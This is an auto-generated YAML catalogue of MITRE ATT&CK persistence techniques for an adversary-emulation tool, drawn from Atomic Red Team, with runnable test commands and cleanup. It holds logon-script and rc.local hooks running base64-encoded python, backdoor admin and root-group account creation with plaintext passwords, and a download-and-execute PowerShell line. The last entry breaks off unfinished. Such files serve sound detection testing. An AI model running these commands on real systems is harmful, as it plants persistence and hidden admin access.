# AutoStrike MITRE ATT&CK Techniques - persistence
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1037.001
  name: Logon Script (Windows)
  description: |-
    Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)

    Adversaries may use these scripts to maintain persistence on a single system. Depending on the acce...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Logon Scripts
      type: cmd
      platform: windows
      command: |-
        echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
        REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
      cleanup: |-
        REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f >nul 2>&1
        del %temp%\art.bat >nul 2>&1
        del "%USERPROFILE%\desktop\T1037.001-log.txt" >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1037/001
  is_safe: false
- id: T1037.004
  name: RC Scripts
  description: |-
    Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.

    Adversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
    - linux
  executors:
    - name: rc.common
      type: bash
      platform: macos
      command: sudo echo osascript -e 'tell app "Finder" to display dialog "Hello World"' >> /etc/rc.common
      timeout: 60
      elevation_required: true
    - name: rc.common (2)
      type: bash
      platform: linux
      command: |-
        filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
        printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
        echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
        printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
        sudo chmod +x /etc/rc.common
      cleanup: origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi
      timeout: 60
      elevation_required: true
    - name: rc.local
      type: sh
      platform: linux
      command: |-
        filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
        [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local
        echo "\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
        printf 'exit 0' | sudo tee -a /etc/rc.local
        sudo chmod +x /etc/rc.local
      cleanup: origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1037/004
  is_safe: false
- id: T1037.005
  name: Startup Items
  description: |-
    Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)

    This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the ap...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Add file to Local Library StartupItems
      type: sh
      platform: macos
      command: sudo touch /Library/StartupItems/EvilStartup.plist
      cleanup: sudo rm /Library/StartupItems/EvilStartup.plist
      timeout: 60
      elevation_required: true
    - name: Add launch script to launch daemon
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist /Library/StartupItems/StartupParameters.plist
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037.005_daemon.sh /Library/StartupItems/atomic.sh
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037_005_daemon.plist /tmp/T1037_005_daemon.plist
        sudo /Library/StartupItems/atomic.sh start
      cleanup: |-
        sudo launchctl unload /tmp/T1037_005_daemon.plist
        sudo rm /tmp/T1037_005_daemon.plist
        sudo rm /Library/StartupItems/atomic.sh
        sudo rm /Library/StartupItems/StartupParameters.plist
        sudo rm /tmp/T1037_005_daemon.txt
      timeout: 60
      elevation_required: true
    - name: Add launch script to launch agent
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist /Library/StartupItems/StartupParameters.plist
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037.005_agent.sh /Library/StartupItems/atomic.sh
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037_005_agent.plist /tmp/T1037_005_agent.plist
        /Library/StartupItems/atomic.sh start
      cleanup: |-
        sudo launchctl unload /tmp/T1037_005_agent.plist
        sudo rm /tmp/T1037_005_agent.plist
        sudo rm /Library/StartupItems/atomic.sh
        sudo rm /Library/StartupItems/StartupParameters.plist
        sudo rm /tmp/T1037_005_agent.txt
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1037/005
  is_safe: false
- id: T1098
  name: Account Manipulation
  description: 'Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compro...'
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Admin Account Manipulate
      type: powershell
      platform: windows
      command: |-
        $x = Get-Random -Minimum 2 -Maximum 9999
        $y = Get-Random -Minimum 2 -Maximum 9999
        $z = Get-Random -Minimum 2 -Maximum 9999
        $w = Get-Random -Minimum 2 -Maximum 9999
        Write-Host HaHa_$x$y$z

        $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

        foreach($member in $fmm) {
            if($member -like "*Administrator*") {
                $account = $member.Name.Split("\")[-1] # strip computername\
                $originalDescription = (Get-LocalUser -Name $account).Description
                Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
                Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
                Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
                }
            }
      cleanup: |-
        $list = Get-LocalUser |?{$_.Description -like "atr:*"}
        foreach($u in $list) {
          $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
          Set-LocalUser -Name $u.Name -Description $Matches.Description
          Rename-LocalUser -Name $u.Name -NewName $Matches.Name
          Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
        }
      timeout: 120
      elevation_required: true
    - name: Domain Account and Group Manipulate
      type: powershell
      platform: windows
      command: "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"atr--$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False \nAdd-ADGroupMember \"Domain Admins\" $account"
      cleanup: Get-ADUser -LDAPFilter "(&(samaccountname=atr--*)(givenName=Test))" | Remove-ADUser -Confirm:$False
      timeout: 120
    - name: Password Change on Directory Service Restore Mode (DSRM) Account
      type: cmd
      platform: windows
      command: ntdsutil "set dsrm password" "sync from domain account %username%" "q" "q"
      timeout: 120
      elevation_required: true
    - name: 'Domain Password Policy Check: Short Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
    - name: 'Domain Password Policy Check: No Number in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
    - name: 'Domain Password Policy Check: No Special Character in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
    - name: 'Domain Password Policy Check: No Uppercase Character in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
    - name: 'Domain Password Policy Check: No Lowercase Character in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
    - name: 'Domain Password Policy Check: Only Two Character Classes'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
    - name: 'Domain Password Policy Check: Common Password Use'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1098
  is_safe: false
- id: T1098.004
  name: SSH Authorized Keys
  description: Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
  executors:
    - name: Modify SSH Authorized Keys
      type: sh
      platform: linux
      command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
      cleanup: unset ssh_authorized_keys
      timeout: 60
    - name: Modify SSH Authorized Keys
      type: sh
      platform: macos
      command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
      cleanup: unset ssh_authorized_keys
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1098/004
  is_safe: false
- id: T1133
  name: External Remote Services
  description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitr...
  tactic: persistence
  tactics:
    - persistence
    - initial-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Running Chrome VPN Extensions via the Registry 2 vpn extension
      type: powershell
      platform: windows
      command: |-
        $extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"

        foreach ($extension in $extList) {
          New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
          New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
        Start chrome
        Start-Sleep -Seconds 30
        Stop-Process -Name "chrome"
      cleanup: |-
        $extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"

        foreach ($extension in $extList) {
        Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1133
  is_safe: false
- id: T1136.001
  name: Local Account
  description: "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account.  In Linux, the `useradd` command can be used, while on macOS systems, the <code>dscl -create</code> command can be used. Local accounts..."
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Create a user account on a Linux system
      type: bash
      platform: linux
      command: useradd -M -N -r -s /bin/bash -c evil_account evil_user
      cleanup: userdel evil_user
      timeout: 60
      elevation_required: true
    - name: Create a user account on a FreeBSD system
      type: sh
      platform: linux
      command: pw useradd evil_user -s /usr/sbin/nologin -d /nonexistent -c evil_account
      cleanup: rmuser -y evil_user
      timeout: 60
      elevation_required: true
    - name: Create a user account on a MacOS system
      type: bash
      platform: macos
      command: |-
        dscl . -create /Users/evil_user
        dscl . -create /Users/evil_user UserShell /bin/zsh
        dscl . -create /Users/evil_user RealName "Evil Account"
        dscl . -create /Users/evil_user UniqueID "1010"
        dscl . -create /Users/evil_user PrimaryGroupID 80
        dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user
      cleanup: dscl . -delete /Users/evil_user
      timeout: 60
      elevation_required: true
    - name: Create a new user in a command prompt
      type: cmd
      platform: windows
      command: net user /add "T1136.001_CMD" "T1136.001_CMD!"
      cleanup: net user /del "T1136.001_CMD" >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Create a new user in PowerShell
      type: powershell
      platform: windows
      command: New-LocalUser -Name "T1136.001_PowerShell" -NoPassword
      cleanup: Remove-LocalUser -Name "T1136.001_PowerShell" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Create a new user in Linux with `root` UID and GID.
      type: bash
      platform: linux
      command: |-
        useradd -g 0 -M -d /root -s /bin/bash butter
        if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "butter:BetterWithButter" | sudo chpasswd; else echo "BetterWithButter" | passwd --stdin butter; fi;
      cleanup: userdel butter
      timeout: 60
      elevation_required: true
    - name: Create a new user in FreeBSD with `root` GID.
      type: sh
      platform: linux
      command: |-
        pw useradd butter -g 0 -d /root -s /bin/sh
        echo "BetterWithButter" | pw usermod butter -h 0
      cleanup: pw userdel butter
      timeout: 60
      elevation_required: true
    - name: Create a new Windows admin user
      type: cmd
      platform: windows
      command: |-
        net user /add "T1136.001_Admin" "T1136_pass"
        net localgroup administrators "T1136.001_Admin" /add
      cleanup: net user /del "T1136.001_Admin" >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Create a new Windows admin user via .NET
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1136/001
  is_safe: false
- id: T1136.002
  name: Domain Account
  description: |-
    Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)

    Such accounts may be used to establ...
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Create a new Windows domain admin user
      type: cmd
      platform: windows
      command: |-
        net user "T1136.002_Admin" "T1136_pass123!" /add /domain
        net group "Domain Admins" "T1136.002_Admin" /add /domain
      cleanup: net user "T1136.002_Admin" >nul 2>&1 /del /domain
      timeout: 120
    - name: Create a new account similar to ANONYMOUS LOGON
      type: cmd
      platform: windows
      command: net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
      cleanup: net user "ANONYMOUS  LOGON" >nul 2>&1 /del /domain
      timeout: 120
    - name: Create a new Domain Account using PowerShell
      type: powershell
      platform: windows
      command: |-
        $SamAccountName = 'T1136.002_Admin'
        $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
        $User.SamAccountName = $SamAccountName
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        $User.DisplayName = $SamAccountName
        $User.Save()
        $User
      cleanup: cmd /c "net user T1136.002_Admin /del >nul 2>&1"
      timeout: 120
    - name: Active Directory Create Admin Account
      type: sh
      platform: linux
      command: |-
        echo "dn: CN=Admin User,CN=Users,DC=example,DC=test\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@example.test\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test" > tempadmin.ldif
        echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif
        ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif
      cleanup: |-
        echo removing Atomic User (temporary user)
        echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
        ldapmodify -H ldap://adVM:389 -x -D admin@example.test -w s3CurePssw0rD! -f deleteuser.ldif
        rm deleteuser.ldif
        rm tempadmin.ldif
      timeout: 60
    - name: Active Directory Create User Account (Non-elevated)
      type: sh
      platform: linux
      command: |-
        echo "dn: cn=Atomic User, cn=Users,dc=example,dc=test\nobjectClass: person\ncn: Atomic User\nsn: User" > tempadmin.ldif
        echo ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif
        ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif
      cleanup: |-
        echo removing Atomic User (temporary user)
        echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
        ldapmodify -H ldap://adVM:389 -x -D user@example.test -w s3CurePssw0rD! -f deleteuser.ldif
        rm deleteuser.ldif
        rm tempadmin.ldif
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1136/002
  is_safe: false
- id: T1137
  name: Office Application Startup
  description: |-
    Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.

    A variety of features have been discovered in Outlook that can be abused to obtain persistence, such ...
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Office Application Startup - Outlook as a C2
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /v Level /t REG_DWORD /d 1 /f
        mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
        echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /v Level /f >nul 2>&1
        del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1137
  is_safe: false
- id: T1137.001
  name: Office Template Macros
  description: |-
    Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)

    Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respec...
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell
